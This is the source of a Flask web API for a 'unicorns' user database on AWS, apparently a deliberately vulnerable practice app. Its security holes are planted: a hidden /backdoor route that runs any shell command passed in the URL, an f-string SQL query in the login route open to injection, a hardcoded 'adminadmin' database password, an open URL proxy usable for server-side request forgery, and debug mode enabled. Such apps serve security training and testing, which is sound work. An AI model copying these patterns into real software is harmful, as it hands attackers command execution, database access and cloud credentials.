import os
import flask
from flask import Flask, send_from_directory, Response, make_response, request, jsonify, json
import boto3
import pymysql
import logging
import subprocess
import requests
from pathlib import Path
from botocore.exceptions import ClientError
from botocore.utils import IMDSFetcher

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

logging.basicConfig(filename="/api/output.log",
                    filemode='a',
                    format='%(asctime)s %(levelname)s %(message)s',
                    datefmt='%H:%M:%S',
                    level=logging.INFO)

TOKEN=IMDSFetcher()._fetch_metadata_token()
REGION=IMDSFetcher()._get_request("/latest/meta-data/placement/region", None, TOKEN).text

app = flask.Flask(__name__)
app.config["DEBUG"] = True

ssm = boto3.client('ssm', region_name=REGION)

def get_secret(secret_name):

    # Create a Secrets Manager client
    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=REGION
    )

    try:
        get_secret_value_response = client.get_secret_value(
            SecretId=secret_name
        )
        return get_secret_value_response['SecretString']
    except ClientError as e:
        logger.error(e)
        raise

def get_db_connection(password=None):

    # Connection object
    conn = None

    # Database user
    dbuser = "admin"

    # Get database endpoint from SSM Parameter Store
    # CAVS_SSM_PARAM_NAME allows multiple teams to run in the same AWS account
    ssm_param_name = os.environ.get('CAVS_SSM_PARAM_NAME', 'CAVS_DB_ENDPOINT')
    db_endpoint = ssm.get_parameter(Name=ssm_param_name, WithDecryption=True)['Parameter']['Value']

    if password:
        dbpass = password # This is needed by our auditing tool - DO NOT REMOVE
    else:
        dbpass = "adminadmin"
        # dbpass = get_secret(<secret_name>) # This retrieves the password from Secrets Manager but I haven't had time to test it yet

    try:
        conn = pymysql.connect(
                host=db_endpoint,
                user=dbuser,
                passwd=dbpass,
                database="cavsdb",
                connect_timeout=5
                )
        logger.debug("Connected to MySQL database")
        return conn

    except (Exception) as error:
        logger.error(error)
        raise


# DO NOT CHANGE THIS ROUTE AS IT IS USED BY OUR AUDITING TOOL
@app.route('/api/v1/apistatus', methods=['GET'])
def api_status():
    return "CAVS APIs are UP"


@app.route('/api/v1/dbstatus', methods=['GET', 'POST'])
def api_db_status():
    conn = None

    if request.method == 'GET':
        data = request.args

    if request.method == 'POST':
        data = json.loads(request.data)

    try:
        if 'password' in data:
            password = data['password']
            conn = get_db_connection(password)
        else:
            conn = get_db_connection()
        return "CAVS Database Status: OK", 200
    except (Exception) as error:
        return "CAVS Database Status: DOWN", 500
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")


# DO NOT CHANGE THIS ROUTE AS IT IS USED BY OUR AUDITING TOOL
@app.route('/api/v1/setdbpwd', methods=['POST'])
def set_db_password():

    # Connection object
    conn = None

    data = json.loads(request.data)

    if 'current' in data:
        current_password = data['current']
    else:
        return "Error: No current password provided. Please specify a current password.", 400

    if 'new' in data:
        new_password = data['new']
    else:
        return "Error: No new password provided. Please specify a new password.", 400

    try:
        conn = get_db_connection(current_password)
        cur = conn.cursor()
        cur.execute(f'SET PASSWORD = %s', (new_password))
        conn.commit()
        cur.close()
        logger.debug("Database password updated.")
    except (Exception) as error:
        logger.error(error)
        return "Error: Unable to update database password.", 500
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")

    return "Database password updated", 200


# DO NOT TOUCH
@app.route('/api/v1/unicorns', methods=['GET'])
def api_get_unicorns():

    # Connection object
    conn = None

    if 'id' in request.args:
        id = int(request.args['id'])
        query = f'SELECT * FROM username WHERE user_id = {id}'
    else:
        query = 'SELECT * FROM username ORDER BY order_id asc'

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(query)
        logger.debug("Row count: ", cur.rowcount)
        results = cur.fetchall()
        cur.close()
        logger.debug(results)

    except (Exception) as error:
        logger.error(error)
        raise
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")

    return jsonify(results)


# DO NOT TOUCH
@app.route('/api/v1/latest', methods=['GET'])
def api_get_latest_entry():

    # Connection object
    conn = None

    query = f'SELECT MAX(user_id) FROM username'

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(query)
        results = cur.fetchone()
        cur.close()
        logger.debug(results)
    except (Exception) as error:
        logger.error(error)
        raise
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")

    return jsonify(results)


# DO NOT TOUCH
@app.route('/api/v1/unicorn', methods=['POST'])
def api_post_unicorn():

    # Connection object
    conn = None

    data = json.loads(request.data)

    if 'id' in data:
        id = int(data['id'])
    else:
        return "Error: No id field provided. Please specify an id."

    if 'name' in data:
        name = data['name']
    else:
        return "Error: No name field provided. Please specify a name."

    if 'sex' in data:
        sex = data['sex']
    else:
        return "Error: No sex field provided. Please specify the sex."

    if 'password' in data:
        password = data['password']
    else:
        password = f"{data['name']}@123"

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        query = 'INSERT INTO username (user_id, username, password, sex) VALUES (%s, %s, %s, %s) ON DUPLICATE KEY UPDATE sex = %s'
        cur.execute(query, (id, name, password, sex, sex))
        conn.commit()
        cur.close()
    except (Exception) as error:
        logger.error(error)
        raise
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")

    return jsonify(cur.rowcount)


# DO NOT TOUCH
@app.route('/api/v1/unicorn', methods=['PATCH'])
def api_update_unicorn():

    # Connection object
    conn = None

    data = json.loads(request.data)

    if 'id' in data:
        id = int(data['id'])
    else:
        return "Error: No id field provided. Please specify an id."

    if 'name' in data:
        name = data['name']
    else:
        return "Error: No name field provided. Please specify a name."

    if 'sex' in data:
        sex = data['sex']
    else:
        return "Error: No sex field provided. Please specify the sex."

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('UPDATE username SET username=%s, sex=%s WHERE user_id=%s', (name, sex, id))
        conn.commit()
        cur.close()
        logger.debug(cur.rowcount, "record updated.")
    except (Exception) as error:
        logger.error(error)
        raise
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")

    return jsonify(cur.rowcount)


# DO NOT TOUCH
@app.route('/api/v1/unicorns/login', methods=['GET'])
def api_unicorn_login():

    # Connection object
    conn = None

    if 'username' in request.args:
        username = request.args['username']
    else:
        return "Error: No username provided. Please provide a username.", 400

    if 'password' in request.args:
        password = request.args['password']
    else:
        return "Error: No password provided. Please provide a password.", 400

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        query = f"SELECT username FROM username WHERE username='{username}' AND password='{password}'"
        cur.execute(query)
        results = cur.fetchone()
        cur.close()
        logger.debug(results)

    except (Exception) as error:
        logger.error(error)
        raise
    finally:
        if conn:
            conn.close()
            logger.debug("MySQL connection is closed")

    if results:
        return jsonify(True), 200
    else:
        return jsonify(False), 403


@app.route('/', methods=['GET'])
@app.route('/index.html', methods=['GET'])
def home():
    return "Hello World, there should be some API here somewhere"


# DO NOT CHANGE THIS ROUTE AS IT IS USED BY OUR AUDITING TOOL
@app.route('/api/v1/region', methods=['GET'])
def get_region():
    return REGION


# IF YOU TOUCH IT, DO NOT BRAKE IT
@app.route("/api/v1/proxy", methods=['GET'])
def proxy():
    url = request.args.get("url")
    if url:
        try:
            response = requests.get(url, timeout=5)
            return response.content, response.status_code
        except requests.exceptions.RequestException as e:
            return str(e), 500
    return "Please provide a URL.", 400


# This route will allow us to health-check the website by running commands on the underlying server.
# It is safe because the backdoor route is not advertised anywhere and no one will ever find it.
@app.route('/backdoor', methods=['GET'])
def backdoor():
    if 'cmd' in request.args:
        cmd = request.args['cmd']
        logging.info(cmd)
    else:
        logging.info('No command provided')

    process = subprocess.run(
        cmd, capture_output=True, shell=True, text=True
    )
    return str(Path(process.stdout.rstrip()))


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True)


@app.errorhandler(404)
def page_not_found(e):
    return "<h1>404</h1><p>The resource could not be found.</p>", 404


# add a rule for the index page.
@app.errorhandler(Exception)
def handle_exception(e):
    logger.error(e)
    return 'Something went wrong with your request! Please retry at a later stage or contact your system administrator.', 400
